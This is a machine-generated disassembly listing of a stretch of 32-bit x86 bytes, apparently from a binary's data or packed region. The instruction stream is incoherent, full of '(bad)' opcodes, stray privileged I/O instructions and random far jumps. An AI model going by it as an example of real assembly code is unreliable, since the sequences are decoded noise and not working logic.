  4198c4:	inc    ebx
  4198c5:	sub    BYTE PTR [edi],dl
  4198c7:	sbb    al,0x85
  4198c9:	xor    dh,BYTE PTR [esi+0x32]
  4198cc:	icebp  
  4198cd:	xchg   ebp,eax
  4198ce:	jo     0x4198e9
  4198d0:	pop    edx
  4198d1:	or     edi,DWORD PTR [edi+0x17721aad]
  4198d7:	inc    eax
  4198d8:	fisubr WORD PTR es:[ebp+0xd]
  4198dc:	jecxz  0x41991b
  4198de:	jae    0x4198d8
  4198e0:	cmp    al,0x42
  4198e2:	sub    DWORD PTR [eax],esp
  4198e4:	fistp  QWORD PTR [ecx]
  4198e6:	or     DWORD PTR ds:0xa672f4f4,esp
  4198ec:	adc    BYTE PTR [edx+eiz*1+0xf576cd2],0x4d
  4198f4:	adc    BYTE PTR [eax-0xe1f75c9],0x9c
  4198fb:	jo     0x4198be
  4198fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4198fe:	mov    ds:0x4014c196,al
  419903:	xchg   ecx,eax
  419904:	xchg   DWORD PTR [eax],ebp
  419906:	push   es
  419907:	fs add eax,0x43e96236
  41990d:	mov    al,0x65
  41990f:	jle    0x419909
  419911:	adc    eax,DWORD PTR [edx-0x3623b475]
  419917:	xor    bl,ah
  419919:	pop    es
  41991a:	cli    
  41991b:	test   esi,0x7eb812be
  419921:	ffreep st(2)
  419923:	jmp    0xc623:0x47d01085
  41992a:	mov    esi,0x7e414cdc
  41992f:	dec    esi
  419930:	push   eax
  419931:	and    eax,0x76e8f9c0
  419936:	mov    ecx,0x268a2119
  41993b:	retf   0xa627
  41993e:	xor    al,0xed
  419940:	call   0x19b4d98c
  419945:	gs repz hlt 
  419948:	and    al,0x1e
  41994a:	and    ebp,DWORD PTR gs:0xa3db87c5
  419951:	push   ebp
  419952:	repz sub DWORD PTR [eax+0x7],esp
  419956:	shr    DWORD PTR [ebx-0x20234b5b],cl
  41995c:	jp     0x419973
  41995e:	xchg   esi,eax
  41995f:	dec    ebp
  419960:	jge    0x4199ac
  419962:	pushf  
  419963:	lods   eax,DWORD PTR ds:[esi]
  419964:	dec    ecx
  419965:	mov    al,ds:0x374ba89
  41996a:	sub    eax,0xa5522a62
  41996f:	adc    eax,0xac679ec7
  419974:	sub    ebp,edx
  419976:	(bad)  
  419977:	pop    ebp
  419978:	mov    DWORD PTR [esi-0x21],edx
  41997b:	mov    WORD PTR [ebx+edi*8],fs
  41997e:	inc    esp
  41997f:	add    ecx,esp
  419981:	cmp    ecx,DWORD PTR [eax-0x4b01c4cc]
  419987:	out    0x74,eax
  419989:	sub    al,0xb8
  41998b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41998c:	aaa    
  41998d:	dec    ebp
  41998e:	xchg   bx,ax
  419990:	xor    BYTE PTR [ebp-0xb],bh
  419993:	pop    eax
  419994:	mov    ah,0xc8
  419996:	lea    eax,[edx]
  419998:	sbb    BYTE PTR [edx+0x444937d7],al
  41999e:	mov    al,0x39
  4199a0:	add    BYTE PTR [eax],al
  4199a2:	add    BYTE PTR [eax],al
  4199a4:	add    BYTE PTR [eax],al
  4199a6:	push   0xc
  4199a8:	lea    ebx,[eax-0x1806611]
  4199ae:	into   
  4199af:	out    dx,al
  4199b0:	popf   
  4199b1:	adc    esi,DWORD PTR [ecx-0x2cd3ad11]
  4199b7:	xchg   ebx,eax
  4199b8:	add    DWORD PTR [eax],eax
  4199ba:	and    al,BYTE PTR [edi]
  4199bc:	add    BYTE PTR [eax],al
  4199be:	mov    ?,WORD PTR [esi]
  4199c0:	rcl    BYTE PTR [edx-0x1],1
  4199c3:	dec    ebp
  4199c4:	call   0x2dd7:0x50791f7
  4199cb:	push   edi
  4199cc:	jl     0x419966
  4199ce:	nop
  4199cf:	mov    edi,0xb06c63ba
  4199d4:	mov    ebp,0x657717a8
  4199d9:	jae    0x4199ce
  4199db:	add    al,0x80
  4199dd:	stos   DWORD PTR es:[edi],eax
  4199de:	jmp    FWORD PTR [ebx-0x3b96f036]
  4199e4:	xchg   esi,eax
  4199e5:	(bad)  
  4199e6:	in     al,dx
  4199e7:	xchg   ebx,eax
  4199e8:	adc    dh,BYTE PTR [ecx+0x77449cf2]
  4199ee:	ds loope 0x419a20
  4199f1:	enter  0xa41c,0xfc
  4199f5:	iret   
  4199f6:	data16 jle 0x4199a9
  4199f9:	or     ah,BYTE PTR [esi+edi*4-0x1e]
  4199fd:	stc    
  4199fe:	sub    DWORD PTR [ebx-0x2e],eax
  419a01:	dec    edx
  419a02:	ret    0xdad9
  419a05:	push   ds
  419a06:	cmp    edi,DWORD PTR [ebx-0x73]
  419a09:	shl    DWORD PTR [ecx+ecx*1+0x6],0x90
  419a0e:	popw   ds
  419a10:	sbb    DWORD PTR [edx-0x2b],0xac51872f
  419a17:	mov    DWORD PTR [eax],edi
  419a19:	xchg   edi,eax
  419a1a:	add    al,0x66
  419a1c:	jge    0x419a19
  419a1e:	jns    0x4199a1
  419a20:	nop
  419a21:	jge    0x4199e1
  419a23:	test   cl,ah
  419a25:	stos   DWORD PTR es:[edi],eax
  419a26:	pop    es
  419a27:	rcl    BYTE PTR [ebp+0x48f50d8],1
  419a2d:	inc    edx
  419a2e:	pop    edi
  419a2f:	sbb    edi,DWORD PTR [eax-0x415df3aa]
  419a35:	sbb    BYTE PTR [edi-0x2c184e0],al
  419a3b:	jp     0x419a3f
  419a3d:	mov    ecx,0xb391e8e6
  419a42:	retf   0x889b
  419a45:	ja     0x419abe
  419a47:	xchg   esi,eax
  419a48:	rcr    ebp,cl
  419a4a:	pop    esi
  419a4b:	je     0x419aaa
  419a4d:	xor    bh,dl
  419a4f:	or     edx,DWORD PTR [edx]
  419a51:	ret    0x6e9a
  419a54:	xchg   ch,dl
  419a56:	pop    esi
  419a57:	cmp    eax,0x6f0ff0a3
  419a5c:	bnd jae 0x419a75
  419a5f:	adc    eax,0x31194446
  419a64:	enter  0x53ec,0x8b
  419a68:	in     al,dx
  419a69:	mov    eax,ds:0x18beeb07
  419a6e:	xor    ebx,ecx
  419a70:	ret    0x519a
  419a73:	adc    dl,BYTE PTR gs:[edx-0x75]
  419a77:	mov    gs,ebp
  419a79:	aas    
  419a7a:	jmp    0x42f3:0xe57fd645
  419a81:	and    eax,ecx
  419a83:	sub    bl,ah
  419a85:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419a87:	inc    ebp
  419a88:	aam    0x1e
  419a8a:	in     eax,0x5d
  419a8c:	cdq    
  419a8d:	add    esi,DWORD PTR [esi-0x20]
  419a90:	xor    al,0xe0
  419a92:	out    0x36,al
  419a94:	nop
  419a95:	pushf  
  419a96:	xchg   esp,eax
  419a97:	pop    ss
  419a98:	(bad)  
  419a9a:	push   ebp
  419a9b:	aad    0xa
  419a9d:	pushf  
  419a9e:	push   ecx
  419a9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419aa0:	push   cs
  419aa1:	aas    
  419aa2:	aam    0x5f
  419aa4:	leave  
  419aa5:	arpl   WORD PTR [ebx+0x6d70bf4],dx
  419aab:	jge    0x419a5a
  419aad:	fcmove st,st(0)
  419aaf:	or     ch,BYTE PTR [eax-0x61]
  419ab2:	and    al,0x2
  419ab4:	stos   BYTE PTR es:[edi],al
  419ab5:	in     al,dx
  419ab6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419ab7:	hlt    
  419ab8:	(bad)  
  419aba:	sub    edx,DWORD PTR [ecx]
  419abc:	std    
  419abd:	imul   esi,DWORD PTR [ebx+0x79],0xe82f6442
  419ac4:	and    ebx,ebx
  419ac6:	js     0x419b0b
  419ac8:	ins    DWORD PTR es:[edi],dx
  419ac9:	push   ds
  419aca:	dec    esp
  419acb:	faddp  st(1),st
  419acd:	daa    
  419ace:	jecxz  0x419b4a
  419ad0:	lahf   
  419ad1:	inc    DWORD PTR [ecx+eax*8-0x5c4220b2]
  419ad8:	sub    BYTE PTR [edi-0x4b],bl
  419adb:	jl     0x419abf
  419add:	outs   dx,DWORD PTR ds:[esi]
  419ade:	sahf   
  419adf:	cmp    bh,dl
  419ae1:	stos   BYTE PTR es:[edi],al
  419ae2:	dec    eax
  419ae3:	rol    bh,0x5b
  419ae6:	push   ecx
  419ae7:	imul   BYTE PTR [esi]
  419ae9:	mov    ebx,0x964d5161
  419aee:	popa   
  419aef:	inc    ebx
  419af0:	push   esp
  419af1:	sbb    dh,bl
  419af3:	jg     0x419b1e
  419af5:	pop    es
  419af6:	inc    ecx
  419af7:	stos   BYTE PTR es:[edi],al
  419af8:	sub    edi,DWORD PTR [eax]
  419afa:	pop    ds
  419afb:	or     al,0x4e
  419afd:	js     0x419aa7
  419aff:	push   ebp
  419b00:	loop   0x419b75
  419b02:	push   edi
  419b03:	sbb    edi,DWORD PTR [ebx-0x2c]
  419b06:	or     ch,BYTE PTR [edx]
  419b08:	ins    DWORD PTR es:[edi],dx
  419b09:	loope  0x419ab5
  419b0b:	ja     0x419aa7
  419b0d:	fdiv   st(7),st
  419b0f:	inc    esp
  419b10:	iret   
  419b11:	in     eax,0x81
  419b13:	adc    ah,BYTE PTR [ebx-0x6560ce7]
  419b19:	loopne 0x419ab4
  419b1b:	jge    0x419b32
  419b1d:	and    esi,DWORD PTR [eax]
  419b1f:	sbb    al,0xea
  419b21:	stos   BYTE PTR es:[edi],al
  419b22:	push   ebp
  419b23:	out    dx,eax
  419b24:	adc    eax,0x247d747c
  419b29:	push   esp
  419b2a:	jns    0x419b93
  419b2c:	dec    BYTE PTR [edx-0x1f0c15f3]
  419b32:	mov    ebx,0x1ba1519b
  419b37:	std    
  419b38:	xor    ebp,eax
  419b3a:	div    DWORD PTR [esi-0x77]
  419b3d:	or     cl,BYTE PTR [edx-0x2b7fd097]
  419b43:	icebp  
  419b44:	mov    ecx,0x16717cfb
  419b49:	mov    ds:0x217ba4fb,eax
  419b4e:	retf   0x2ddf
  419b51:	mov    eax,ds:0x581d0f03
  419b56:	add    DWORD PTR [edi+0x7100898c],eax
  419b5c:	xor    DWORD PTR [ecx],esp
  419b5e:	(bad)  
  419b5f:	lods   al,BYTE PTR ds:[esi]
  419b60:	mov    edi,ebp
  419b62:	stc    
  419b63:	jns    0x419b24
  419b65:	out    0x6e,al
  419b67:	mov    bh,0xb6
  419b69:	test   DWORD PTR [edi],ecx
  419b6b:	(bad)  
  419b6c:	lea    ebp,[ecx+esi*8+0x6b]
  419b70:	sbb    edi,DWORD PTR [ebx*1+0x159f401a]
  419b77:	jecxz  0x419b47
  419b79:	or     BYTE PTR [esi+0x6a],cl
  419b7c:	add    dl,BYTE PTR [ebp+ebx*2-0x19]
  419b80:	xor    al,0xd0
  419b82:	push   edi
  419b83:	dec    ecx
  419b84:	mov    edx,0x73e06134
  419b89:	push   0x13f8da91
  419b8e:	jo     0x419bf3
  419b90:	sub    DWORD PTR [edx],ebx
  419b92:	xor    BYTE PTR [edi],ch
  419b94:	ret    0x2f1c
  419b97:	bound  eax,QWORD PTR [ecx+ecx*1]
  419b9a:	push   ecx
  419b9b:	push   edi
  419b9c:	fwait
  419b9d:	inc    esp
  419b9e:	add    eax,0xa79c9c4e
  419ba3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419ba4:	test   DWORD PTR [edx-0x3d7d065d],eax
  419baa:	fdiv   st,st(0)
  419bac:	mov    eax,0x11b3d69a
  419bb1:	loop   0x419b3b
  419bb3:	data16 stos BYTE PTR es:[edi],al
  419bb5:	push   esp
  419bb6:	cmp    eax,0xee3babf
  419bbb:	push   ebx
  419bbc:	ins    BYTE PTR es:[edi],dx
  419bbd:	mov    eax,ds:0x7c294295
  419bc2:	mov    eax,ds:0x6249b3a8
  419bc7:	or     BYTE PTR [edx+0x313f9d3a],bl
  419bcd:	mov    esi,0x5fda1f7a
  419bd2:	(bad)  
  419bd3:	in     eax,dx
  419bd4:	test   al,0xce
  419bd6:	mov    bh,0x31
  419bd8:	sbb    eax,0xad7ce8bd
  419bdd:	pop    edx
  419bde:	push   ecx
  419bdf:	inc    ebx
  419be0:	imul   DWORD PTR [esi-0x2f]
  419be3:	in     al,dx
  419be4:	mov    WORD PTR [eax+0x35],?
  419be7:	retf   
  419be8:	leave  
  419be9:	arpl   WORD PTR ds:0xc608a9b4,si
  419bef:	rcr    dl,cl
  419bf1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419bf2:	outs   dx,DWORD PTR fs:[esi]
  419bf4:	xor    ebx,DWORD PTR [edi]
  419bf6:	inc    eax
  419bf7:	loop   0x419bd4
  419bf9:	mov    bh,0x43
  419bfb:	mov    BYTE PTR [edi+0x4b756fa0],ch
  419c01:	pop    ecx
  419c02:	dec    ecx
  419c03:	mov    esi,0xd7f7d832
  419c08:	lock sar DWORD PTR [esi-0x11b73331],cl
  419c0f:	or     cl,BYTE PTR [esi+ebp*4-0x3774dcc7]
  419c16:	addr16 icebp 
  419c18:	sub    al,0x85
  419c1a:	vunpckhps ymm7,ymm0,ymm3
  419c1e:	push   ebx
  419c20:	sub    eax,0x446d3913
  419c25:	pop    ds
  419c26:	std    
  419c27:	int3   
  419c28:	and    BYTE PTR [ebx],bh
  419c2a:	jne    0x419c40
  419c2c:	shr    DWORD PTR [ebp+0x2cae355f],1
  419c32:	cmp    al,0xe9
  419c34:	lea    edi,[ebp+0x77c65f61]
  419c3a:	sbb    al,0xc3
  419c3c:	inc    esp
  419c3d:	jb     0x419bd7
  419c3f:	sbb    ebp,DWORD PTR [ebx-0x2ed1b9eb]
  419c45:	mov    ebx,DWORD PTR [ecx*8+0x60b399cd]
  419c4c:	jbe    0x419cc0
  419c4e:	(bad)  
  419c4f:	in     eax,dx
  419c50:	sti    
  419c51:	mov    dl,0x40
  419c53:	out    0x54,al
  419c55:	retf   0x23e6
  419c58:	cli    
  419c59:	rcl    DWORD PTR [eax-0x9b59791],1
  419c5f:	repz or ch,BYTE PTR [ebx+0x3b]
  419c63:	dec    ebp
  419c64:	ffreep st(7)
  419c66:	dec    ebp
  419c67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419c68:	(bad)  
  419c69:	jae    0x419c6a
  419c6b:	lahf   
  419c6c:	popf   
  419c6d:	pushf  
  419c6e:	inc    ecx
  419c6f:	inc    ebp
  419c70:	push   ebx
  419c71:	pop    ecx
  419c72:	push   esi
  419c73:	jl     0x419c8f
  419c75:	jae    0x419c7a
  419c77:	imul   edi,DWORD PTR [esi],0xffffffd7
  419c7a:	mov    ecx,0x926aa73a
  419c7f:	shr    eax,cl
  419c81:	dec    ebx
  419c82:	bound  eax,QWORD PTR [edi]
  419c84:	shr    DWORD PTR [edx+0x4d],0x46
  419c88:	pop    ds
  419c89:	mov    BYTE PTR [esp+eiz*8],cl
  419c8c:	mov    ds:0x61568ba8,al
  419c91:	or     BYTE PTR [ebp-0x12],0x26
  419c95:	pop    ebx
  419c96:	repnz aad 0xa1
  419c99:	jno    0x419c4b
  419c9b:	test   eax,0xf2daad28
  419ca0:	or     bh,BYTE PTR [esi-0x64]
  419ca3:	xchg   edi,eax
  419ca4:	lds    esi,FWORD PTR [ebx]
  419ca6:	outs   dx,DWORD PTR ds:[esi]
  419ca7:	sahf   
  419ca8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419ca9:	jb     0x419d01
  419cab:	frstor [edi-0x7baf031c]
  419cb1:	and    dh,bh
  419cb3:	and    ch,BYTE PTR [eax-0x44]
  419cb6:	mov    edi,0xa74b21c7
  419cbb:	jle    0x419d00
  419cbd:	fst    st(2)
  419cbf:	mov    DWORD PTR [eax+0xe88759f],ebx
  419cc5:	mov    ebp,DWORD PTR [eax-0x58]
  419cc8:	adc    BYTE PTR [eax],bh
  419cca:	xchg   esi,eax
  419ccb:	xchg   esi,eax
  419ccc:	jno    0x419ce6
  419cce:	mov    ch,0x8e
  419cd0:	mov    ebx,0x1dc433f7
  419cd5:	dec    esp
  419cd6:	and    al,0xab
  419cd8:	in     al,dx
  419cd9:	inc    esp
  419cda:	push   0x4039355b
  419cdf:	les    edx,FWORD PTR [ebp-0x54]
  419ce2:	pop    ebx
  419ce3:	xchg   edx,eax
  419ce4:	cmc    
  419ce5:	pushf  
  419ce6:	(bad)  
  419ce7:	cmp    eax,0xf5c7bf4d
  419cec:	popw   ss
  419cee:	ins    BYTE PTR es:[edi],dx
  419cef:	add    ebx,DWORD PTR [edi]
  419cf1:	cbw    
  419cf3:	ret    
  419cf4:	mov    eax,ds:0x11209151
  419cf9:	jne    0x419d78
  419cfb:	jge    0x419cca
  419cfd:	inc    ecx
  419cfe:	push   ebx
  419cff:	repnz sbb ecx,edi
  419d02:	cmp    eax,0xd2b7c8e6
  419d07:	sub    BYTE PTR [eax+0x33cf4eca],0xf3
  419d0e:	jecxz  0x419d73
  419d10:	or     BYTE PTR [esi+0x12186e76],bh
  419d16:	out    dx,al
  419d17:	inc    ecx
  419d18:	sbb    eax,0x716157
  419d1d:	sbb    DWORD PTR [edi],ebp
  419d1f:	dec    ecx
  419d20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419d21:	or     ecx,DWORD PTR [ebx+0x5b1d086e]
  419d27:	out    dx,eax
  419d28:	sti    
  419d29:	push   ebx
  419d2a:	push   edi
  419d2b:	push   DWORD PTR [ebp+0x7d503f]
  419d31:	mov    ecx,0x61a4ca24
  419d36:	int3   
  419d37:	mov    BYTE PTR [ecx+0x21],ah
  419d3a:	aaa    
  419d3b:	dec    ebx
  419d3c:	mov    eax,0x580f41f3
  419d41:	and    BYTE PTR [ebx+0x50],cl
  419d44:	int3   
  419d45:	cmp    DWORD PTR [ebp-0x4951ebad],ecx
  419d4b:	lods   eax,DWORD PTR ss:[esi]
  419d4d:	loopne 0x419d96
  419d4f:	das    
  419d50:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419d52:	add    al,0x7a
  419d54:	lea    ebp,[ecx+0x64b19120]
  419d5a:	cmp    ecx,0xffffff85
  419d5d:	jp     0x419d48
  419d5f:	mov    ebp,DWORD PTR [eax]
  419d61:	scas   eax,DWORD PTR es:[edi]
  419d62:	(bad)  [edi+0x33]
  419d65:	mov    DWORD PTR [eax-0x60],eax
  419d68:	test   al,0xff
  419d6a:	mov    DWORD PTR [edx+0x4363c290],esi
  419d70:	jmp    0x9801:0x14804f2b
  419d77:	out    0x7f,al
  419d79:	push   eax
  419d7a:	imul   eax,DWORD PTR [edx+0x40],0xffffffb9
  419d7e:	xor    DWORD PTR [ebp-0x7e],esp
  419d81:	clc    
  419d82:	ror    DWORD PTR ds:0xe72ca3ba,cl
  419d88:	push   ss
  419d89:	arpl   WORD PTR [ecx],si
  419d8b:	mov    dh,0xa1
  419d8d:	aas    
  419d8e:	and    BYTE PTR [edx-0x6d],cl
  419d91:	mov    esp,ecx
  419d93:	mov    ds:0x2a05aff0,al
  419d98:	(bad)  
  419d9a:	mov    cl,0x6c
  419d9c:	xor    esp,DWORD PTR [edi]
  419d9e:	push   ecx
  419d9f:	push   0x60
  419da1:	fs jo  0x419e16
  419da4:	daa    
  419da5:	pop    edi
  419da6:	aad    0xe7
  419da8:	xchg   esp,edi
  419daa:	mov    ah,0x71
  419dac:	in     al,0xa
  419dae:	int3   
  419daf:	mov    al,ds:0x1dadec94
  419db4:	(bad)  
  419db5:	xor    al,0x98
  419db7:	add    al,0x69
  419db9:	ret    
  419dba:	dec    esp
  419dbb:	sub    edi,esi
  419dbd:	dec    esi
  419dbe:	cmp    al,al
  419dc0:	ret    0x43de
  419dc3:	sub    esi,DWORD PTR [ecx-0xe75be6e]
  419dc9:	hlt    
  419dca:	inc    eax
  419dcb:	popa   
  419dcc:	dec    esi
  419dcd:	lea    eax,[ebx*4-0x6fdf732b]
  419dd4:	(bad)  
  419dd5:	and    al,0xad
  419dd7:	xchg   ebp,eax
  419dd8:	dec    edi
  419dd9:	jb     0x419da1
  419ddb:	dec    ecx
  419ddc:	loope  0x419dd0
  419dde:	adc    eax,0x1a254cb0
  419de3:	mov    edx,0xa274882c
  419de8:	lds    ebp,FWORD PTR [ecx]
  419dea:	mul    BYTE PTR [ecx-0x24f7528e]
  419df0:	pop    ss
  419df1:	push   esi
  419df2:	jno    0x419db5
  419df4:	rcl    ebp,0x7
  419df7:	and    BYTE PTR [esi+0xb],ch
  419dfa:	pop    es
  419dfb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419dfc:	inc    esp
  419dfd:	loopne 0x419de2
  419dff:	add    esi,DWORD PTR [edx]
  419e01:	push   eax
  419e02:	and    ecx,DWORD PTR [edx+edx*2+0x60122e54]
  419e09:	xor    BYTE PTR [esi-0x1f9b004c],bl
  419e0f:	imul   edi,DWORD PTR [esi-0x30],0xffffff8e
  419e13:	pop    esi
  419e14:	mov    eax,ds:0xc4ea90ce
  419e19:	sub    eax,0xa092b188
  419e1e:	adc    al,BYTE PTR [eax-0x5cc3cf54]
  419e24:	jb     0x419e6b
  419e26:	push   esp
  419e27:	sbb    DWORD PTR [ecx-0x67],ebp
  419e2a:	out    0xf1,eax
  419e2c:	jp     0x419deb
  419e2e:	or     ebx,edi
  419e30:	cmp    esp,0xfffffffc
  419e33:	test   ebp,ebx
  419e35:	sub    al,0xfa
  419e37:	sbb    bh,BYTE PTR [eax+0x3b]
  419e3a:	stos   DWORD PTR es:[edi],eax
  419e3b:	and    ah,BYTE PTR [edi+ebx*1+0xb]
  419e3f:	shl    DWORD PTR [ebx+0x75],1
  419e42:	add    ebx,DWORD PTR [edx+0x2d79d1a6]
  419e48:	mov    dl,0x6c
  419e4a:	sub    bl,ah
  419e4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419e4d:	cwde   
  419e4e:	in     al,0x57
  419e50:	adc    edx,ecx
  419e52:	inc    ebp
  419e53:	push   es
  419e54:	andps  xmm5,xmm6
  419e57:	les    ebx,FWORD PTR [eax+eax*4+0x4d]
  419e5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419e5c:	pop    ds
  419e5d:	mov    al,0xb5
  419e5f:	pop    edi
  419e60:	js     0x419e39
  419e62:	mov    eax,0xc5b1e77e
  419e67:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419e69:	nop
  419e6a:	push   ebp
  419e6b:	push   esp
  419e6c:	stos   BYTE PTR es:[edi],al
  419e6d:	cmp    BYTE PTR [esi],ch
  419e6f:	and    dl,BYTE PTR [edi-0x63f0c18e]
  419e75:	pop    ss
  419e76:	mov    eax,ds:0xcef685f1
  419e7b:	or     al,0xfa
  419e7d:	jb     0x419e75
  419e7f:	out    0x75,eax
  419e81:	push   cs
  419e82:	loop   0x419e8f
  419e84:	dec    eax
  419e85:	outs   dx,DWORD PTR ds:[esi]
  419e86:	jg     0x419eb3
  419e88:	xchg   edx,eax
  419e89:	xor    edx,DWORD PTR [esp+ebx*1]
  419e8c:	dec    esi
  419e8d:	arpl   ax,cx
  419e8f:	push   eax
  419e90:	dec    edi
  419e91:	cli    
  419e92:	int3   
  419e93:	xchg   ebp,edi
  419e95:	sti    
  419e96:	jl     0x419ea4
  419e98:	in     eax,dx
  419e99:	dec    BYTE PTR [edx]
  419e9b:	neg    ebx
  419e9d:	and    ah,BYTE PTR [ebp-0x74c45961]
  419ea3:	pop    edx
  419ea4:	mov    cl,0x34
  419ea6:	jne    0x419ef4
  419ea8:	jns    0x419e49
  419eaa:	push   ebx
  419eab:	xlat   BYTE PTR ds:[ebx]
  419eac:	adc    DWORD PTR [edx],0x2a79d70a
  419eb2:	out    0x51,eax
  419eb4:	retf   0x2b4b
  419eb7:	outs   dx,DWORD PTR ds:[esi]
  419eb8:	xor    esi,esi
  419eba:	push   esp
  419ebb:	mov    ebx,0x9ef8e584
  419ec0:	or     DWORD PTR [ebx],ebx
  419ec2:	inc    edx
  419ec3:	ja     0x419f42
  419ec5:	call   0x9d9f29b4
  419eca:	ins    DWORD PTR es:[edi],dx
  419ecb:	test   DWORD PTR [esi-0x27],edx
  419ece:	call   FWORD PTR [eax]
  419ed0:	dec    esp
  419ed1:	mov    edi,0x88ba3b95
  419ed6:	push   ecx
  419ed7:	push   ds
  419ed8:	retf   0x78a0
  419edb:	dec    esi
  419edc:	xchg   DWORD PTR [ecx-0x41],esi
  419edf:	addr16 jae 0x419f46
  419ee2:	cmc    
  419ee3:	adc    ecx,DWORD PTR [ebx+eax*4+0x7ea60bb7]
  419eea:	adc    al,0xf
  419eec:	or     BYTE PTR gs:[ebx+0x44],ch
  419ef0:	jl     0x419e92
  419ef2:	into   
  419ef3:	sbb    eax,0xa55070f1
  419ef8:	and    eax,0x3ac08bb0
  419efd:	outs   dx,DWORD PTR ds:[esi]
  419efe:	mov    esp,0xac8febd1
  419f03:	fcmovne st,st(1)
  419f05:	inc    esi
  419f06:	(bad)  
  419f07:	nop
  419f08:	adc    edi,DWORD PTR [eax+0x75]
  419f0b:	call   0x7c2c:0xf6623e7d
  419f12:	pop    eax
  419f13:	int3   
  419f14:	pop    eax
  419f15:	jecxz  0x419f51
  419f17:	push   edx
  419f18:	out    0x11,eax
  419f1a:	stc    
  419f1b:	dec    eax
  419f1c:	pop    eax
  419f1d:	call   0xc066db48
  419f22:	call   0xdeed:0x3c9af773
  419f29:	mov    cl,0x99
  419f2b:	adc    dl,bl
  419f2d:	push   0xe
  419f2f:	cli    
  419f30:	mov    esp,0x12a6fe6e
  419f35:	mov    ch,0x2b
  419f37:	pop    eax
  419f38:	outs   dx,BYTE PTR ds:[esi]
  419f39:	leave  
  419f3a:	scas   al,BYTE PTR es:[edi]
  419f3b:	cmp    cl,BYTE PTR [edx]
  419f3d:	pop    esp
  419f3e:	jle    0x419efd
  419f40:	mov    cl,0x74
  419f42:	pop    esp
  419f43:	daa    
  419f44:	fistp  DWORD PTR [eax+0x3c]
  419f47:	fbld   TBYTE PTR [esi]
  419f49:	pop    eax
  419f4a:	pop    ss
  419f4b:	mov    cl,0xdf
  419f4d:	xchg   ebx,eax
  419f4e:	cli    
  419f4f:	push   0x5
  419f51:	push   es
  419f52:	xlat   BYTE PTR ds:[ebx]
  419f53:	pop    DWORD PTR [ecx+0x1dd234f]
  419f59:	out    0xed,eax
  419f5b:	daa    
  419f5c:	ds pop es
  419f5e:	out    0xb7,eax
  419f60:	jge    0x419f3b
  419f62:	out    0x32,al
  419f64:	push   ds
  419f65:	xlat   BYTE PTR ds:[ebx]
  419f66:	into   
  419f67:	test   BYTE PTR [esi*8+0xead9c90],dl
  419f6e:	loop   0x419f0b
  419f70:	loope  0x419f38
  419f72:	mov    dl,0x72
  419f74:	loopne 0x419fca
  419f76:	sbb    eax,0x936791c
  419f7b:	shl    DWORD PTR [edi+edi*1+0x27],1
  419f7f:	jno    0x419ff7
  419f81:	cmp    edi,ebx
  419f83:	and    bl,bh
  419f85:	add    bl,BYTE PTR [ebx+ecx*8]
  419f88:	imul   esp,ebx,0x5b0b232a
  419f8e:	and    eax,DWORD PTR [ebp-0x51062beb]
  419f94:	dec    eax
  419f95:	xor    DWORD PTR [ebx+0x16babbb2],edi
  419f9b:	das    
  419f9c:	mov    bh,dl
  419f9e:	sub    eax,0xd4ecf2bd
  419fa3:	push   0x33fc9985
  419fa8:	dec    eax
  419fa9:	int    0xa9
  419fab:	xchg   BYTE PTR [ecx],ch
  419fad:	push   cs
  419fae:	daa    
  419faf:	and    al,0x82
  419fb1:	pop    esi
  419fb2:	mov    ecx,0x87e9b292
  419fb7:	inc    ebp
  419fb8:	mov    ch,0x98
  419fba:	repnz enter 0x9f4c,0x8e
  419fbf:	iret   
  419fc0:	push   ebx
  419fc1:	stos   BYTE PTR es:[edi],al
  419fc2:	mov    edx,edi
  419fc4:	(bad)  
  419fc5:	jp     0x419f97
  419fc7:	mov    eax,0x457d43f6
  419fcc:	inc    ebp
  419fcd:	mov    bh,0x86
  419fcf:	push   DWORD PTR [ecx-0x72]
  419fd2:	xor    BYTE PTR es:[ecx],ah
  419fd5:	xor    ecx,DWORD PTR [ecx-0x31]
  419fd8:	aas    
  419fd9:	shr    DWORD PTR [ecx+0xbba00a1],0xd9
  419fe0:	clc    
  419fe1:	mov    ds:0xce9fbc8,eax
  419fe6:	pushf  
  419fe7:	cmp    DWORD PTR [esi],ecx
  419fe9:	sub    eax,0x3b1d13d
  419fee:	lahf   
  419fef:	xor    BYTE PTR [ebp-0x2c84a1f9],ah
  419ff5:	pop    ecx
  419ff6:	or     edx,esi
  419ff8:	mov    ds:0xfa5bae1b,eax
  419ffd:	je     0x419fc5
  419fff:	imul   esp,DWORD PTR [esi+0x606d5764],0xffffffef
  41a006:	xchg   edi,eax
  41a007:	pop    edx
  41a008:	jecxz  0x419fca
  41a00a:	and    ch,BYTE PTR [ecx-0x7c]
  41a00d:	push   0x1b
  41a00f:	stc    
  41a010:	dec    eax
  41a011:	xchg   ecx,eax
  41a012:	sub    al,0x20
  41a014:	cld    
  41a015:	into   
  41a016:	retf   
  41a017:	lods   al,BYTE PTR cs:[esi]
  41a019:	fdiv   QWORD PTR [ebx-0x21]
  41a01c:	enter  0xb38f,0x6c
  41a020:	mov    esi,0xf7b8042c
  41a025:	inc    edi
  41a026:	pop    edx
  41a027:	sbb    DWORD PTR [ebx-0x2fef3f88],ecx
  41a02d:	pop    es
  41a02e:	(bad)  
  41a02f:	and    DWORD PTR [esi-0x2d],esi
  41a032:	(bad)
  41a035:	lods   eax,DWORD PTR ds:[esi]
  41a036:	fidivr WORD PTR [edx-0x63eb735b]
  41a03c:	test   dh,cl
  41a03e:	imul   esp
  41a040:	pushf  
  41a041:	pop    ds
  41a042:	fmul   DWORD PTR [edx]
  41a044:	mov    ds:0x12e1a00f,eax
  41a049:	loop   0x41a04c
  41a04b:	js     0x41a088
